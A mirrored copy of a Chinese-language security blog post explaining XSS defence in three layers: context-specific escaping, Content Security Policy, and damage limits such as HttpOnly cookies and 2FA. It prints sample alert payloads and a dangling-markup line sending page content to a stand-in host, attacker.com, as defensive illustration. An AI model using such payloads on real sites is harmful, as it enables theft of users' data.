<!DOCTYPE html>
<html>
  <head>
  <title>淺談 XSS 攻擊與防禦的各個環節 – 觀點2 – 高頻版 git.io/JUJZT</title>

      <meta charset="utf-8" />
    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>

    
    <meta name="description" content="
淺談 XSS 攻擊與防禦的各個環節
——
" />
    <meta property="og:description" content="
淺談 XSS 攻擊與防禦的各個環節
——
" />
    
    <meta name="author" content="觀點2" />

    
    <meta property="og:title" content="淺談 XSS 攻擊與防禦的各個環節" />
    <meta property="twitter:title" content="淺談 XSS 攻擊與防禦的各個環節" />
    

  <link rel="stylesheet" type="text/css" href="/oped2/style.css" />
  <link rel="alternate" type="application/rss+xml" title="觀點2 - 高頻版 git.io/JUJZT" href="/oped2/feed.xml" />

  <!-- Social Share Kit CSS -->
  <link rel="stylesheet" href="/oped2/assets/css/social-share-kit.css" type="text/css">
  <link rel="stylesheet" href="/oped2/assets/css/font-awesome.min.css" type="text/css">
  <link rel="stylesheet" href="/oped2/assets/css/bootstrap.min.css" type="text/css">
  <script type="text/javascript" src="/oped2/assets/js/jquery-3.5.1.js"></script>
  <script type="text/javascript" src="/oped2/assets/js/page.js"></script>

</head>

  <body>
    <div class="wrapper-masthead">
  <div class="container">
    <header class="masthead clearfix">
      

      <div class="site-info">
        <h1 class="site-name" style="display: inline-block;"><a href="/oped2/">觀點2</a></h1>
        <i class="site-description" style="font-size: 12px;">高頻版 git.io/JUJZT</i>
      </div>

      <nav>
        <span id="search-container" >
          <a href="/oped2/tools"><i class="fa fa-bookmark twitter" title="百宝箱"></i></a>
        <a><i class="fa fa-search" title="限前100結果"></i></a><input type="text" id="search-input" placeholder="標題 作者 來源 日期 (5685)"
          style="margin: 10px 0px 0px 0px; height: 30px;width: auto" title="本站最正確的打開方式">
        </span>
        
        
        <a href="/oped2/categories" style="color: Tomato;"><i class="fa fa-tags" title="分类"></i></a>
        
        
        
        <a href="https://be4.herokuapp.com/" style="color: #003366;"><i class="fa fa-comments" title="论坛"></i></a>
        
        
        
        <a href="/oped2/about"><i class="fa fa-info-circle" title="关于"></i></a>
        
        
        <a title="电脑热键：&larr;上一篇(页), &rarr;下一篇(页), ins同来源新一篇，del同来源旧一篇" onclick="toggle_visibility('help')"><i class="fa fa-question-circle"></i></a>
        <a id="fa-home" href="https://nodebe4.github.io" title="BE4服务列表" onclick="//toggle_visibility('site-list')"><i class="fa fa-home" aria-hidden="true"></i></a>
      </nav>

    </header>
    <div id="site-list" class="tags" style="display: block;text-align: right;border-bottom: 1px solid lightGray;"><noscript><span style="background-color: #e8e8e8;color: #d10000;font-size: 14px;">开启浏览器JavaScript以获取搜索功能和更好的浏览体验</span></noscript></div>
    <p id="help" style="font-size: 14px;display: none;text-align: right;"><span style="color:green;">电脑热键：&larr;上一篇(页), &rarr;下一篇(页), ins同来源新一篇, del同来源旧一篇</span>; <span style="color:orange">对应触屏FAB：上下右左</span>; 轉Markdown<a href="https://euangoddard.github.io/clipboard2markdown/"><i class="fa fa-file-text-o"></i></a></p>
  </div>
</div>

<script type="text/javascript" >
  function toggle_visibility(id){
    var help = document.getElementById(id)
    if (help.style.display=='none'){
      help.style.display='block';
    }else{
      help.style.display='none';
    }
  }

  const url = "https://nodebe4.github.io/sitelist.json"

  document.addEventListener("DOMContentLoaded", function(event){
    // var homebtn = document.getElementById("fa-home")
    // homebtn.removeAttribute("href")
    var content = document.getElementById("site-list");
    content.innerHTML = ''
    var ul = document.createElement("ul")
    ul.classList.add("label")
    content.appendChild(ul)
    var cnt = 0

    $.getJSON(url, function(allsites) {

      allsites.map(item =>{
        var li = document.createElement('li')
        li.classList.add("tag")
        li.id = 'site-' + cnt
        ul.appendChild(li)
        var a0 = document.createElement('a')
        li.appendChild(a0)
        a0.href = item.url[0]
        var span = document.createElement('span')
        a0.appendChild(span)
        span.innerText = item['name']
        // span.style.backgroundColor = item['background-color']
        // span.style.color='#E4CBC3'
        span.style.color = item['background-color']
        span.style['font-size'] = '14px'
        cnt += 1
        // test_alive(li.id, a0.href)
      })
    })
  })

function test_alive(id, url){
  var divstatus = document.getElementById(id)
  const base = 'https://textance.herokuapp.com/title/'
  var fullurl = base + url
  $.ajax({
      url: fullurl,
      complete: function(data) {
        if (data.responseText.includes('502')){
          // divstatus.style.color='#FBB7B7'
          // divstatus.style.color='gray'
          // divstatus.title = "服务器无响应"
          divstatus.parentNode.removeChild(divstatus)
        }else{
          // divstatus.style.color='#B6FAC8'
          divstatus.title = data.responseText
        }
      }
  });
  return divstatus
}
</script>



    <!-- Left & centered positioning -->

<div class="ssk-sticky ssk-right ssk-center ssk-sticky-hide-xs ssk-group ssk-round">
  
    <a href="https://be4news.pythonanywhere.com/archivenow/ia/https%3A%2F%2Fmedium.com%2Fcymetrics%2Fxss-attack-and-defense-97621a057dd1%3Fsource%3Drss-f1fb3e40dc37------2" class="ssk ssk-link" title="存到互联网档案馆" target="_blank"></a>
    <a href="https://www.facebook.com/sharer.php?u=https://medium.com/cymetrics/xss-attack-and-defense-97621a057dd1?source=rss-f1fb3e40dc37------2" class="ssk ssk-facebook"></a>
    <a href="https://twitter.com/intent/tweet?url=https://medium.com/cymetrics/xss-attack-and-defense-97621a057dd1?source=rss-f1fb3e40dc37------2&text=淺談 XSS 攻擊與防禦的各個環節&hashtags=觀點2" class="ssk ssk-twitter"></a>
    <a href="https://reddit.com/submit?url=https://medium.com/cymetrics/xss-attack-and-defense-97621a057dd1?source=rss-f1fb3e40dc37------2&title=淺談 XSS 攻擊與防禦的各個環節" class="ssk ssk-reddit"></a>
    <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://medium.com/cymetrics/xss-attack-and-defense-97621a057dd1?source=rss-f1fb3e40dc37------2&title=淺談 XSS 攻擊與防禦的各個環節" class="ssk ssk-linkedin"></a>
    <a href="mailto:{email_address}?subject=淺談 XSS 攻擊與防禦的各個環節&body=
淺談 XSS 攻擊與防禦的各個環節
——
" class="ssk ssk-email"></a>
    <a href="http://pinterest.com/pin/create/link/?url=https://medium.com/cymetrics/xss-attack-and-defense-97621a057dd1?source=rss-f1fb3e40dc37------2" class="ssk ssk-pinterest"></a>
    <a href="https://www.tumblr.com/widgets/share/tool?canonicalUrl=https://medium.com/cymetrics/xss-attack-and-defense-97621a057dd1?source=rss-f1fb3e40dc37------2&title=淺談 XSS 攻擊與防禦的各個環節&caption=
淺談 XSS 攻擊與防禦的各個環節
——
&tags=觀點2" class="ssk ssk-tumblr"></a>
    <a href="https://buffer.com/add?text=淺談 XSS 攻擊與防禦的各個環節&url=https://medium.com/cymetrics/xss-attack-and-defense-97621a057dd1?source=rss-f1fb3e40dc37------2" class="ssk ssk-buffer"></a>
</div>


    <div id="main" role="main" class="container">
      
  <!-- Html Elements for Search -->
  <ul id="results-container" class="searched" style="color: #2980B9;"></ul>

  <script src="/oped2/assets/js/simple-jekyll-search.min.js"></script>

  <!-- Configuration -->
  <script>
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('results-container'),
    json: '/oped2/search.json',
    searchResultTemplate: '<li><a href="{url}" title="{desc}">{title}</a><time>{date}</time><a class="tag">{category}</a></li>',
    noResultsText: '没找到',
    limit: 100,
    fuzzy: false,
    exclude: ['Welcome']
  })

  </script>

      







  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
    


  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
  
  

  
    



<article class="post">
  <h1>淺談 XSS 攻擊與防禦的各個環節</h1>
  <!-- Look the author details up from the site config. -->
  

  <div>
    <span class="date">
      2021-06-17
    </span>

    <!-- Output author details if some exist. -->
    
      
        <span>
            <!-- Personal Info. -->
            <a  style="font-size:14px;">作者: Huli</a>
        </span>
      
    


    <ul class="tag">
      <li>
        <a href="https://nodebe4.github.io/oped2/categories/#medium">
          medium
        </a>
      </li>
    </ul>

    
        <span>
            <!-- Personal Info. -->
            <a href="https://medium.com/cymetrics/xss-attack-and-defense-97621a057dd1?source=rss-f1fb3e40dc37------2" style="font-size:14px;">原文</a>
        </span>
    

    <span style="float: right;" title="medium的其它文章">
      <a style="font-size: 14px;" rel="nofollow" href="#sametag" class="tags">#medium 的其它文章</a>
    </span>

  </div>

  <div class="entry">
    
    
    
    <!--1623914411000-->
<p><a href="https://medium.com/cymetrics/xss-attack-and-defense-97621a057dd1?source=rss-f1fb3e40dc37------2">淺談 XSS 攻擊與防禦的各個環節</a>
——</p>

<div>
  <figure>
<img alt="" src="https://cdn-images-1.medium.com/max/1024/0*RH-cte3memvgWBBJ" />    <figcaption>
Photo by <a href="https://unsplash.com/@jakobustrop?utm_source=medium&amp;utm_medium=referral">Jakob Braun</a> on <a href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral">Unsplash</a>
    </figcaption>
  </figure>
  <h3 id="section">前言</h3>
  <p>談到 XSS（Cross-site scripting），許多人可能都只想到「就是網站上被攻擊者植入程式碼」，但若是仔細去想的話，會發現這之中其實還有很多環節都可以再深入探討。</p>
  <p>而我所謂的這些「環節」，也可以理解成不同的「關卡」。</p>
  <p>舉例來說，第一關當然就是盡可能防止自己的網站被 XSS 攻擊，不要讓攻擊者在網站中能夠植入程式碼。而「讓攻擊者在網站中植入程式碼」這件事，又可以往下再細分成不同地方的植入，例如說 HTML 的植入，或者是 HTML 元素屬性中的植入，又或是 JavaScript 程式碼中的植入，這些都有著不同的攻擊以及防禦方式。</p>
  <p>而除了防止被植入程式碼以外，防守方應該還要進一步去想：「那如果真的不幸被植入程式碼了，可以怎麼辦？」</p>
  <p>這就是第二個關卡。雖然說第一關我們已經盡可能做好準備了，但難保不會有漏洞產生，因此守好第一關是不夠的，也要對第二關進行防守。</p>
  <p>假設今天攻擊者真的找到一個地方植入程式碼，那我們是不是可以想辦法阻止它執行？這就是 CSP（Content Security Policy）出場的時候了，藉由設定一些規則讓不合法的程式碼無法執行。例如說可以讓 inline 的 JavaScript 無法執行，那 &lt;img src=x onerror=alert(1)&gt; 就會變得無效。</p>
  <p>若是攻擊者真的很厲害，連 CSP 的規則都繞過了呢？這時就進入到第三關了，第三關的假設是攻擊者已經能夠在網站上執行任意程式碼。</p>
  <p>這時候還可以防守什麼呢？那就是試圖把損害控制到最低。</p>
  <p>以 Medium 這種部落格的平台來說，若是可以利用 XSS 把別人的帳號奪走（account takevoer），就是個嚴重的漏洞；或是因為 Medium 有付費牆的功能，因此若是能透過 XSS 把錢轉到攻擊者的帳號，也會是一個很嚴重的問題。</p>
  <p>而我們要在「網站已經被 XSS」的前提下，試圖去防禦這些攻擊。</p>
  <p>接著，就讓我們來看看不同的關卡有哪些不同的防禦方法。</p>
  <h3 id="section-1">第一關：阻止攻擊者在網站植入程式碼</h3>
  <p>要防止 XSS 的第一步，當然就是阻止攻擊者在網站上植入他們想要的東西，核心精神可以濃縮成一句：</p>
  <blockquote>
<em>永遠不要相信使用者的輸入</em>  </blockquote>
  <p>只要是有輸入的地方，都應該去做驗證。在輸出不被信任的資料時應該要做跳脫（escape）。</p>
  <p>舉例來說，假設有個功能可以讓使用者自己設定暱稱，因為使用者可以自己輸入任何東西，所以在輸出這邊的資料時就要特別注意。</p>
  <p>如果在 render 時就是直接把使用者的輸入原封不動 render 出來，那若是使用者輸入的暱稱是：&lt;script&gt;alert(1)&lt;/script&gt; ，其他人瀏覽這一頁的時候就會看到畫面跳出一個 alert，因為暱稱輸入的東西被當作程式碼執行了。</p>
  <p>這種攻擊可以成立的主因就是使用者的輸入變成了程式碼的一部分，導致未預期的行為。</p>
  <p>要防止這種行為，就是在 render 的時候要做跳脫。例如說要先把 &lt; 轉成 &amp;lt，這樣在畫面上看到的依然是 &lt;，但是對 parser 來說那並不是標籤開始的符號，而是文字的 &lt; ，就不會被當作 HTML 標籤來解析。</p>
  <p>如此一來，就能防止攻擊者植入程式碼。</p>
  <p>不過，這還只是對跳脫的粗淺理解而已，真正需要注意的是在不同的情境之下，可能會需要用不同的方式跳脫，就如同這兩篇講的一樣：</p>
  <ol>
    <li><a href="https://www.ptt.cc/bbs/Soft_Job/M.1582437563.A.6F7.html">Re: [討論] 為什麼SQL注入和XSS漏洞會這麼氾濫?(1)</a></li>
    <li><a href="https://www.ptt.cc/bbs/Soft_Job/M.1582441681.A.A7B.html">Re: [討論] 為什麼SQL注入和XSS漏洞會這麼氾濫?(2)</a></li>
  </ol>
  <p>假設你只有想到說要對標籤做跳脫，把 &lt;&gt; 這兩個符號都做了 escape，那確實沒有辦法直接插入標籤。可是，如果 render 暱稱的地方是這樣呢？</p>
  <figure>
<img alt="" src="https://cdn-images-1.medium.com/max/883/1*GrAY679kzwUgbIgeLXF7FQ.png" />
  </figure>
  <p>除了在 div 裡面輸出暱稱之外，也會在 img 的 alt 標籤裡把暱稱 render 出來。這時候如果只跳脫了 &lt;&gt; 是不夠的，因為如果我讓 nickname 變成 " onload="alert(1) 的話，結合起來就會變成：</p>
  <figure>
<img alt="" src="https://cdn-images-1.medium.com/max/1024/1*vgx5sVfZnMKaoixSLfKWzw.png" />
  </figure>
  <p>攻擊者可以利用 " 關閉前面的屬性，然後創出一個新的屬性 onload ，達成 HTML 標籤屬性利用的 XSS。</p>
  <p>所以常見的特殊符號像是 "'&lt;&gt; 都要去做 escape，才能確保在不同地方時都有防禦效果。而這點其實許多程式語言或是 framework 都有做到了，例如說 PHP 的 htmlspecialchars：</p>
  <figure>
<img alt="" src="https://cdn-images-1.medium.com/max/1024/0*syUjL3nA82_N4Qov" />    <figcaption>
截圖自：<a href="https://www.php.net/manual/en/function.htmlspecialchars.php">https://www.php.net/manual/en/function.htmlspecialchars.php</a>
    </figcaption>
  </figure>
  <p>那這樣就打完收工了嗎？還沒。</p>
  <p>因為，在連結裡的內容又是另外一回事了，例如說：&lt;a href="&lt;?= link ?&gt;"&gt;my website&lt;/a&gt;</p>
  <p>有一種東西叫做 JavaScript pseudo-protocol，可以利用 javascript: 來執行 JS 程式碼，像是這樣：&lt;a href="javascript:alert(1)"&gt;my website&lt;/a&gt; ，在使用者點擊這個連結時，就會跳出 alert。</p>
  <p>而 javascript:alert(1) 這幾個字，完全沒有包含我們上面需要 escape 的特殊字元 "'&lt;&gt;&amp;，所以在這個狀況我們需要有不同的 escape 方法，或者是直接檢查內容，指定開頭必須要是 http:// 或是 http:// 之類的。</p>
  <p>這就是我剛剛講的，在不同地方，需要用不同的方式來進行跳脫及防禦。如果都是用同一種的話，有些地方就會失效。</p>
  <p>有些人看到這邊會想說：「阿～不用擔心啦！我用的前端框架都幫我做好了，預設都會 escape 啦！不會被 XSS」</p>
  <p>這個宣稱大部分是對的，現在確實很多前端的框架會處理這件事，但要特別注意我剛剛提的 href 的例子，因為 javascript:alert(1) 這幾個字元都不是特殊字元，所以跳脫完還是長一樣，依然會有這樣的漏洞。</p>
  <p>React 在 v16.9 的時候就針對這個 case 新增了警告： <a href="https://reactjs.org/blog/2019/08/08/react-v16.9.0.html#deprecating-javascript-urls">Deprecating javascript: URLs</a> ，並且在之後的 release 中會自動阻擋這個行為。不過根據測試的結果，目前的版本 v17.0.2 只會警告而已，還不會阻擋。</p>
  <p>這邊有一些相關的討論： <a href="https://github.com/facebook/react/issues/16592">React@16.9 block javascript:void(0); #16592</a> 與 <a href="https://github.com/facebook/react/issues/16382">False-positive security precaution warning (javascript: URLs) #16382</a>，想看程式碼的話在這邊： <a href="https://github.com/facebook/react/blob/v17.0.2/packages/react-dom/src/shared/sanitizeURL.js">react/packages/react-dom/src/shared/sanitizeURL.js</a>。</p>
  <p>除了看使用情境跳脫不是件容易的事情以外，意識到有哪些地方是使用者可以自己輸入的也沒有想像中簡單。</p>
  <p>因為除了資料庫或者是 API 是你的資料來源之外，URL 可能也是。有些程式碼會直接把網址列上的某個 query string 放到 JS 裡，之後直接把這個變數輸出到畫面上，這就是無意間信任了不該信任的資料。</p>
  <p>舉例來說，搜尋頁面的網址可能長這樣： https://example.com/search?q=hello ，而在程式中是這樣寫的：</p>
  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const q = 'hello' // 從網址列拿下來的參數document.querySelector('.search').innerHTML = q</code></pre></div>  </div>
  <p>這時如果你把 q 換成 HTML：&lt;script&gt;alert(1)&lt;/script&gt; ，在沒做跳脫就輸出的狀況下，就會有 XSS 漏洞的產生。</p>
  <p>最後呢，有些網站會允許內容有部分的 HTML，最常見的就是部落格，因為部落格要有樣式嘛，除非是自訂資料格式，不然有些網站都直接把內文存成 HTML，然後用 <a href="https://github.com/cure53/DOMPurify">DOMPurify</a> 或是 <a href="https://github.com/leizongmin/js-xss">js-xss</a> 之類的套件去過濾，把不合法的標籤或是屬性過濾掉。</p>
  <p>雖然說使用這些 library 相對安全，但需要注意的是版本要時常更新，因為這類型的套件也可能會有漏洞的產生（ <a href="https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/">Mutation XSS via namespace confusion — DOMPurify &lt; 2.0.17 bypass</a>）。另外也需要注意使用時的設定，設定錯誤的話也有可能造成問題，實際案例可以參考： <a href="https://medium.com/cymetrics/prevent-xss-might-be-harder-than-you-thought-ce8c422540b">防止 XSS 可能比想像中困難</a>。</p>
  <p>總結一下，想要做好第一關的 XSS 防禦，需要注意的事情有：</p>
  <ol>
    <li>意識到哪邊是使用者可以自己輸入資料的地方</li>
    <li>針對不同情境去做 XSS 的防禦</li>
  </ol>
  <p>也可以考慮導入現成的 <a href="https://www.cloudflare.com/zh-tw/learning/ddos/glossary/web-application-firewall-waf/">WAF</a>（Web Application Firewall），直接幫你把一些看起來很可疑的 payload 擋住。不過 WAF 也不是百分百有效，只是多一道防線而已。</p>
  <p>或是也可以關心一下這個比較新的東西：<a href="https://web.dev/trusted-types/">Trusted Types</a>。</p>
  <h3 id="section-2">第二關：阻止惡意程式碼被執行</h3>
  <p>假設第一關被突破了，攻擊者可以在網站上插入任意程式碼，這時候要考慮的事情就是如何阻止程式碼被執行。</p>
  <p>這一關的重點是 CSP，Content Security Policy。</p>
  <p>CSP 是一系列的規則，用來跟瀏覽器講說哪些來源的資源可以被載入，哪些不行，可以利用 response header 或是 &lt;meta&gt; tag 來指定頁面的 CSP 規則。</p>
  <p>舉例來說，如果我很確定網站上的 JS 都來自於同一個 origin，那我的 CSP 就可以這樣寫：</p>
  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Content-Security-Policy: default-src 'self'; script-src 'self'</code></pre></div>  </div>
  <p>self 代表的是 same origin 的意思。這樣寫的話，如果你試著載入不是當前 origin 的 JS，或者是直接在頁面上用 inline 的方式執行 script，都會看到瀏覽器報錯：</p>
  <figure>
<img alt="" src="https://cdn-images-1.medium.com/max/748/0*iTSbOPB46f9hyrMi" />    <figcaption>
違反 CSP 的錯誤訊息
    </figcaption>
  </figure>
  <p>CSP 可以制定許多不同資源的規則，需要更詳細的解釋可以看這邊： <a href="https://content-security-policy.com/">Content Security Policy Reference</a> 。</p>
  <p>想找到比較完整的 CSP，去看一些大公司的實作是最快的，接著我們直接來看一下 GitHub 的 CSP 長什麼樣子（為了方便閱讀，有重新排版過）：</p>
  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>default-src 'none'base-uri 'self';block-all-mixed-content;connect-src 'self' uploads.github.com www.githubstatus.com collector.githubapp.comapi.github.com github-cloud.s3.amazonaws.com github-production-repository-file-5c1aeb.s3.amazonaws.comgithub-production-upload-manifest-file-7fdce7.s3.amazonaws.com github-production-user-asset-6210df.s3.amazonaws.comhtml-translator.herokuapp.com cdn.optimizely.com logx.optimizely.com/v1/events wss://alive.github.com*.actions.githubusercontent.com wss://*.actions.githubusercontent.com online.visualstudio.com/api/v1/locationsinsights.github.com;font-src github.githubassets.com;form-action 'self' github.com gist.github.com;frame-ancestors 'none';frame-src render.githubusercontent.com;img-src 'self' data: github.githubassets.com identicons.github.com collector.githubapp.com github-cloud.s3.amazonaws.comsecured-user-images.githubusercontent.com/ *.githubusercontent.com;manifest-src 'self';media-src github.com user-images.githubusercontent.com/;script-src github.githubassets.com;style-src 'unsafe-inline' github.githubassets.com;worker-src github.com/socket-worker-3f088aa2.js gist.github.com/socket-worker-3f088aa2.js</code></pre></div>  </div>
  <p>想要檢查 CSP 規則有沒有明顯漏洞的話，可以到 <a href="https://csp-evaluator.withgoogle.com/">CSP Evaluator</a> ，而 GitHub 的 CSP 設置得很嚴謹，幾乎每一種資源都有設定。</p>
  <p>這邊可以看到 script-src 的值只有 github.githubassets.com。因為沒有 unsafe-inline 的關係，所以 inline script 無法執行，而引入 script 的話也只能從 github.githubassets.com 這個來源引入，幾乎封死了執行 script 的路。</p>
  <p>而許多網站的 CSP 其實並不會設置得這麼嚴格，就有比較高的機率會被繞過，例如說 <a href="https://blog.orange.tw/2019/03/a-wormable-xss-on-hackmd.html">A Wormable XSS on HackMD!</a> 直接用 Cloudflare CDN 上的 AngularJS + CSTI 繞過； <a href="https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md">HackMD Stored XSS &amp; Bypass CSP with Google Tag Manager</a> 則是用 Google Tag Manager 來繞。</p>
  <p>另外，在某些情境之下就算乍看被封死，依然可以透過現有的 script 來幫你繞過，詳細資訊可以參考這個很經典的演講： <a href="https://github.com/google/security-research-pocs/tree/master/script-gadgets">Breaking XSS mitigations via Script gadgets</a> 。</p>
  <p>那如果真的沒辦法執行 script，還有什麼可以做的呢？</p>
  <p>就算只是插入 HTML，也還是可以做事的。</p>
  <p>例如說可以利用插入 HTML meta tag 來造成重新導向，把使用者導到惡意網站去，像這樣：</p>
  <p>&lt;meta http-equiv="refresh" content="0;https://example.com"&gt;</p>
  <p>或者是插入 &lt;img src="https://attacker.com?q= （注意這邊 src 的雙引號只有開頭），讓整段 HTML 變成：</p>
  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;img src="https://attacker.com?q=&lt;div&gt;user info&lt;/div&gt;&lt;div&gt;sensitive data&lt;/div&gt;&lt;div class="test"&gt;&lt;/div&gt;</code></pre></div>  </div>
  <p>藉由 src 沒有閉合的 "，就可以拿到下一個 " 為止的 HTML 內容，把這些當作 query string 的一部分傳到 server，而這中間可能就會有一些敏感資料的存在。所以 img-src 的 CSP 規則也是有用處的，可以防止這類型的攻擊。</p>
  <p>或也可以結合 <a href="https://blog.huli.tw/2021/01/23/dom-clobbering/">DOM Clobbering</a> ，看看有沒有什麼地方可以攻擊。</p>
  <p>因此，就算不能執行 script，依然有其他攻擊手法可以用。</p>
  <p>GitHub 在 2017 年時有寫過一篇 <a href="https://github.blog/2017-01-19-githubs-post-csp-journey/">GitHub’s post-CSP journey</a>，特別講了他們的 CSP 是怎麼設計的，防範了哪些已知的攻擊，寫得非常不錯。</p>
  <p>他們甚至還有一個 bug bounty 是 <a href="https://bounty.github.com/targets/csp.html">GitHub CSP</a> ，就算沒有找到 XSS 也沒有關係，只要提出能繞過 CSP 的手法就可以拿到獎金。</p>
  <h3 id="xss">第三關：降低 XSS 攻擊之損害</h3>
  <p>如果街亭跟前兩關都沒守住，XSS 勢在必行的話，接下來要思考的就是該如何降低 XSS 攻擊之損害。</p>
  <p>這邊我覺得有兩個面向可以去思考：</p>
  <ol>
    <li>避免攻擊者用受害者的身份登入</li>
    <li>避免攻擊者透過 XSS 進行比較重要的操作</li>
  </ol>
  <p>先來談第一種，有一種最常見的攻擊方式就是偷 cookie，把 document.cookie 偷走之後，若是使用者驗證身份的 token 在裡面，就可以直接用受害者的身份登入。因此這種驗證用的 cookie，請記得設定 HttpOnly ，就能確保前端無法直接用 document.cookie 就取得 cookie。</p>
  <p>如果因為各種原因沒辦法保護使用者的 token，那就可以再設下其他關卡，例如說最常見的就是地點的檢查。</p>
  <p>假設一個使用者一直以來都在台灣，可是卻突然在烏克蘭發了一個 request，這時就可以先把這個操作擋住，並寄信告知使用者有可疑操作，麻煩他確認是否為本人。或也可以檢查使用者的瀏覽器是否一致，不一致的話一樣要先經過確認，加上另一道手續來保障使用者的安全。</p>
  <p>再來談第二種，就算 cookie 沒被偷走，因為攻擊者已經能執行任意程式碼了，所以直接打後端 API 還是做得到的，而且 cookie 會自動帶上。因此只要是使用者可以做的操作，攻擊者基本上都做得到。</p>
  <p>以部落格平台來說的話，發文、編輯文章或是刪文都是做得到的，攻擊者就只要直接利用 XSS 去打 API 就行了。</p>
  <p>這時候對於一些比較重要的操作，就應該設置第二道關卡，例如說更改密碼需要輸入原密碼，那這樣因為攻擊者不知道原密碼是什麼，打 API 也沒有用。或者是要轉帳的時候需要用手機接收驗證碼，沒有手機的話就無法執行操作。</p>
  <figure>
<img alt="" src="https://cdn-images-1.medium.com/max/1024/1*MwIuAG1GOlfm46wDGIAlAg.png" />    <figcaption>
擷取自 GitHub，改密碼時需要輸入原密碼
    </figcaption>
  </figure>
  <p>其實說白話一點就是 2FA（Two-factor authentication）啦。對於這些重要操作，除了登入之外還要設下第二種可以確認是本人的機制，這樣就算被打出 XSS，攻擊者也無法執行這些操作，可以讓損害降低。</p>
  <h3 id="section-3">總結</h3>
  <p>資安的世界既廣又深，這篇提到的都只是大方向的概觀而已。若是再深入下去，每個環節都可以再變成多個獨立的主題，而且也可以結合其他的攻擊，例如說：</p>
  <ol>
    <li>自訂的 XSS 過濾規則有沒有可能有漏洞，會被繞過？有的話又該怎麼繞？</li>
    <li>雖然都過濾了，會不會可以結合 server side 的漏洞來繞過？例如說 double encoding</li>
    <li>CSP 設得夠嚴謹嗎？有沒有現成的繞過方式？</li>
    <li>2FA 機制有實作完整嗎？Rate limit 有設好嗎？沒有設的話是不是暴力破解就被爆破了？</li>
    <li>忘記密碼的機制有實作正確嗎？會不會可以用別人的身份幫忙重設密碼？</li>
  </ol>
  <p>XSS 並不是全有或是全無這麼簡單，有的網站雖然被 XSS，但影響範圍有限，而有的網站一被 XSS，連使用者的帳號密碼都可以輕易更改，直接把帳號給搶過來。</p>
  <p>在防禦 XSS 的時候，如果只防禦了第一關，只有想到「我要把 render 的內容 escape」就容易造成上面所講的狀況，要嘛就是整個網站都很安全連 XSS 都沒有，要嘛就是一被打出 XSS，整個網站就被打穿。</p>
  <p>所以在防禦的時候必須注意到上面提的這些不同的環節，針對每個環節都去做防禦，設下多個防線。就算攻擊者可以突破第一關，可能也會被第二關的 CSP 擋下，無法執行 JS；就算第二關被破了，還有第三關守著，降低 XSS 的影響程度，不會因為一個漏洞就讓使用者的帳戶整個被搶走。</p>
<img src="https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=97621a057dd1" width="1" height="1" alt="" />  <hr />
  <p><a href="https://medium.com/cymetrics/xss-attack-and-defense-97621a057dd1">淺談 XSS 攻擊與防禦的各個環節</a> was originally published in <a href="https://medium.com/cymetrics">Cymetrics tech blog</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>
</div>

  </div>

  <hr style="border-top:1px solid #28323C;"/>

<font size=2px>
  文章版权归原作者所有。
</font>

<div style="text-align:center"><img width="1px" src="https://i.imgur.com/RinUcXm.png" alt="二维码分享本站" style="text-align:center"/></div>

  <div id="sametag">
    <h4 style="display: inline-block;">#medium 的其它文章</h4>
    <span>--<a href="https://nodebe4.github.io/oped2/2025-02-15/%E4%B8%8D%E6%9C%83%E6%97%A5%E6%96%87%E5%8E%BB%E8%80%83-JLPT-%E6%97%A5%E6%AA%A2-N2-%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%B9%BE%E5%88%86/">最新</a>-</span>
    <span>-<a href="https://nodebe4.github.io/oped2/2014-08-27/A-Letter-to-My-Former-Family-From-a-Shelter-Cat/">最早</a>--</span>
    
      <li>
        <time>2021-07-09</time>
        <a href="https://nodebe4.github.io/oped2/2021-07-09/%E7%82%BA%E4%BB%80%E9%BA%BC%E5%BF%98%E8%A8%98%E5%AF%86%E7%A2%BC%E6%99%82%E5%8F%AA%E8%83%BD%E9%87%8D%E8%A8%AD-%E4%B8%8D%E6%8A%8A%E8%88%8A%E5%AF%86%E7%A2%BC%E5%91%8A%E8%A8%B4%E6%88%91/">
          為什麼忘記密碼時只能重設，不把舊密碼告訴我？
        </a>
      </li>
    
    
      <li>
        <time>2021-06-25</time>
